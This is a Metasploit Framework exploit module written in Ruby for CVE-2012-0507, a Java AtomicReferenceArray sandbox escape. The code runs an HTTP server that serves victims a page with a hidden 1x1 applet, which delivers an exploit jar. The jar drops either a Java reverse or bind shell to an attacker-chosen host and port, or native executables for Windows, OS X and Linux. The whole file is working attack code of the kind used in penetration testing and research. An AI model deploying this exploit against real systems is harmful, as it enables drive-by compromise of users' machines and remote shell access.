##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize( info = {} )
		super( update_info( info,
			'Name'           => 'Java AtomicReferenceArray Type Violation Vulnerability',
			'Description'    => %q{
					This module exploits a vulnerability due to the fact that
				AtomicReferenceArray uses the Unsafe class to store a reference in an
				array directly, which may violate type safety if not used properly.
				This allows a way to escape the JRE sandbox, and load additional classes
				in order to perform malicious operations.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'sinn3r',       # metasploit module
					'juan vazquez', # metasploit module
					'egypt'         # special assistance
				],
			'References'     =>
				[
					['CVE', '2012-0507'],
					['OSVDB', '80724'],
					['BID', '52161'],
					['URL', 'http://weblog.ikvm.net/PermaLink.aspx?guid=cd48169a-9405-4f63-9087-798c4a1866d3'],
					['URL', 'http://blogs.technet.com/b/mmpc/archive/2012/03/20/an-interesting-case-of-jre-sandbox-breach-cve-2012-0507.aspx'],
					['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2012-0507']
				],
			'Platform'       => [ 'java', 'win', 'osx', 'linux', 'solaris' ],
			'Payload'        => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
			'Targets'        =>
				[
					[ 'Generic (Java Payload)',
						{
							'Platform' => ['java'],
							'Arch' => ARCH_JAVA,
						}
					],
					[ 'Windows x86 (Native Payload)',
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86,
						}
					],
					[ 'Mac OS X PPC (Native Payload)',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_PPC,
						}
					],
					[ 'Mac OS X x86 (Native Payload)',
						{
							'Platform' => 'osx',
							'Arch' => ARCH_X86,
						}
					],
					[ 'Linux x86 (Native Payload)',
						{
							'Platform' => 'linux',
							'Arch' => ARCH_X86,
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 14 2012'
			))
	end


	def exploit
		# load the static jar file
		path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2012-0507.jar" )
		fd = File.open( path, "rb" )
		@jar_data = fd.read(fd.stat.size)
		fd.close

		super
	end


	def on_request_uri( cli, request )
		data = ""
		host = ""
		port = ""
		peer = "#{cli.peerhost}:#{cli.peerport}"

		if not request.uri.match(/\.jar$/i)
			if not request.uri.match(/\/$/)
				send_redirect( cli, get_resource() + '/', '')
				return
			end

			print_status("#{peer} - Sending #{self.name}")

			payload = regenerate_payload( cli )
			if not payload
				print_error("#{peer} - Failed to generate the payload." )
				return
			end

			if target.name == 'Generic (Java Payload)'
				if datastore['LHOST']
					jar  = payload.encoded
					host = datastore['LHOST']
					port = datastore['LPORT']
					vprint_status("Java reverse shell to #{host}:#{port} from #{peer}" )
				else
					port = datastore['LPORT']
					datastore['RHOST'] = cli.peerhost
					vprint_status( "Java bind shell on #{cli.peerhost}:#{port}..." )
				end
				if jar
					print_status( "Generated jar to drop (#{jar.length} bytes)." )
					jar = Rex::Text.to_hex( jar, prefix="" )
				else
					print_error("#{peer} - Failed to generate the executable." )
					return
				end
			else

				# NOTE: The EXE mixin automagically handles detection of arch/platform
				data = generate_payload_exe

				if data
					print_status("#{peer} - Generated executable to drop (#{data.length} bytes)." )
					data = Rex::Text.to_hex( data, prefix="" )
				else
					print_error("#{peer} - Failed to generate the executable." )
					return
				end

			end

			send_response_html( cli, generate_html( data, jar, host, port ), { 'Content-Type' => 'text/html' } )
			return
		end

		print_status( "#{peer} - sending jar..." )
		send_response( cli, generate_jar(), { 'Content-Type' => "application/octet-stream" } )

		handler( cli )
	end

	def generate_html( data, jar, host, port )
		jar_name = rand_text_alpha(rand(6)+3) + ".jar"

		html  = "<html><head></head>"
		html += "<body>"
		html += "<applet archive=\"#{jar_name}\" code=\"msf.x.Exploit.class\" width=\"1\" height=\"1\">"
		html += "<param name=\"data\" value=\"#{data}\"/>" if data
		html += "<param name=\"jar\" value=\"#{jar}\"/>" if jar
		html += "<param name=\"lhost\" value=\"#{host}\"/>" if host
		html += "<param name=\"lport\" value=\"#{port}\"/>" if port
		html += "</applet></body></html>"
		return html
	end

	def generate_jar()
		return @jar_data
	end

end
